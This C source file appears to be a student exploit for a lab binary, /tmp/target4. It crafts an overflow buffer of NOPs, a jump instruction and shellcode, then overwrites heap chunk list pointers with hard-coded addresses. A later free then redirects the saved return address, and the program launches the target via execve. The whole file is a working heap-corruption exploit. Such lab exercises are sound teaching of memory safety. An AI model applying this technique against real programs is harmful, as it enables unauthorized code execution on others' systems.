#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

#define NOP '\x90'
#define PFRONT 104

int main(void)
{
  char *args[3];
  char *env[1];
  int i;

  args[0] = TARGET; 

  char buff[400];
  char *p;
  p = buff;

  // fill buffer with NOPS/1s
  memset(p, NOP, sizeof(buff));
  *(long*)(buff + 4) = 0xffffffff;

  // jump instruction is 2 bytes + 38 forward = 40 bytes
  // jump 40 to shellcode since portion before q is too small to contain shellcode
  char *jump = "\xeb\x26";

  // fill buffer past the header fields with jump instruction
  memcpy (p, jump, strlen(jump));
  
  // fill shellcode where q shoul b since p is too small to contain it
  memcpy (p + 40, shellcode, strlen(shellcode));

  // 1st malloc(p) has p at 8059b78
  // 1st malloc(q) has q at 8059b10 (difference is 104, 96 data + 8 for headers)
  // 2nd malloc(p) has p at 8059ae8 (difference is 40, 32 data + 8 for headers)
  // these address are the start of data, 8 bytes of headers are before them

  // beginning of 1st chunk begins at 8059ae8, override s.l value with location of jump
  *(long*)(buff + 32) = 0x08059ae8;

  // override the s.r value of 2nd chunk with eip value of foo
  *(long*)(buff + 36) = 0xbffffcec;


  buff[399] = '\x00';

  args[1] = buff; 
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
